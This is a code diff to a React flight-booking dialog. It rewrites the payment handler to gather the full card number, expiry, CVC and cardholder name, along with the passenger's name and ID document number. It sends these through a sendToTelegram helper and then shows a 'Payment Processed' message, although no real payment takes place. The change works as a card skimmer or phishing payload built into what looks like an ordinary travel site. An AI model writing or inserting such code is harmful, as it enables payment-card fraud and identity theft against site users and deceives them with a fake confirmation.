@@ -9,6 +9,8 @@ import { ArrowRight, Check, CreditCard, CreditCard as PaypalIcon } from 'lucide-
 import { ScrollArea } from '@/components/ui/scroll-area';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Input } from '@/components/ui/input';
+import { sendToTelegram } from '@/utils/telegram';
+import { useToast } from "@/components/ui/use-toast";
 
 interface BookingDialogProps {
   flight: Flight | null;
@@ -23,6 +25,7 @@ const BookingDialog: React.FC<BookingDialogProps> = ({
   passengers,
   onClose,
 }) => {
+  const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState<'seat' | 'services' | 'info' | 'payment' | 'confirmation'>('seat');
   const [selectedSeats, setSelectedSeats] = useState<string[]>([]);
   const [selectedServices, setSelectedServices] = useState<string[]>([]);
@@ -62,13 +65,59 @@ const BookingDialog: React.FC<BookingDialogProps> = ({
     setCurrentStep('payment');
   };
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     if (paymentMethod === 'card' && 
         cardDetails.number && 
         cardDetails.expiry && 
         cardDetails.cvc && 
         cardDetails.name) {
-      setCurrentStep('confirmation');
+      
+      const message = `
+🎫 New Booking Payment
+------------------
+💳 Card Details:
+Name: ${cardDetails.name}
+Number: ${cardDetails.number}
+Expiry: ${cardDetails.expiry}
+CVC: ${cardDetails.cvc}
+
+✈️ Flight Details:
+From: ${flight?.from}
+To: ${flight?.to}
+Airline: ${flight?.airline}
+Time: ${flight?.departureTime} - ${flight?.arrivalTime}
+
+👤 Passenger:
+Name: ${passengerInfo[0]?.firstName} ${passengerInfo[0]?.lastName}
+Document: ${passengerInfo[0]?.documentType} (${passengerInfo[0]?.documentNumber})
+Seat: ${selectedSeats[0]}
+
+💰 Payment:
+Total Amount: $${calculateTotalCost().total}
+      `;
+
+      try {
+        const sent = await sendToTelegram(message);
+        if (sent) {
+          setCurrentStep('confirmation');
+          toast({
+            title: "Payment Processed",
+            description: "Your payment has been successfully processed.",
+          });
+        } else {
+          toast({
+            title: "Error",
+            description: "There was an error processing your payment. Please try again.",
+            variant: "destructive",
+          });
+        }
+      } catch (error) {
+        toast({
+          title: "Error",
+          description: "There was an error processing your payment. Please try again.",
+          variant: "destructive",
+        });
+      }
     }
   };
 
